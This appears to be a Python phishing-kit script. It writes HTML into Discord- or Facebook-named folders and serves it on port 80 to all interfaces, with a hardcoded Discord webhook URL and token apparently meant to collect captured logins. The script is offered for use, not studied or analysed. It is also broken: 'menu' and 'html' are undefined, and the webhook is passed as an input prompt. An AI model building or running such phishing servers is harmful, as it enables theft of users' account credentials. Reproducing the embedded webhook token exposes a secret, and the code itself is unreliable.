import http.server,requests,sys,colorama
from urllib.request import Request, urlopen
from colorama import Fore,Back
colorama.init()

def LocalServer(path):
    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=path, **kwargs)
    print(menu)
    PORT = 80
    server_address = ("0.0.0.0", PORT)
    server = http.server.HTTPServer
 
    print(f"[{Fore.GREEN}+{Fore.RESET}] URL : https://localhost/")
    print(f"[{Fore.GREEN}+{Fore.RESET}] PORT : ", PORT)
 
    httpd = server(server_address, Handler)
    httpd.serve_forever()


print(menu)
cmd = input(">>> ")

if cmd == "1":
    wh = input("https://discord.com/api/webhooks/1071501347750412388/3C6f-LbqkywnYHkI5bkqw_lz2WUb0X1_uGYdTPDOfiK2_jpQwBRKgG3U3YoPJSHtcYZR")
    with open("web/discord/index.html", 'w') as f:
        f.write(html)
        f.close()
    LocalServer("web/discord")

elif cmd == "2":
    wh = input("https://discord.com/api/webhooks/1071501347750412388/3C6f-LbqkywnYHkI5bkqw_lz2WUb0X1_uGYdTPDOfiK2_jpQwBRKgG3U3YoPJSHtcYZR")
    with open("web/facebook/index.html", 'w') as f:
        f.write(html)
        f.close()
    LocalServer("web/facebook")






        



   

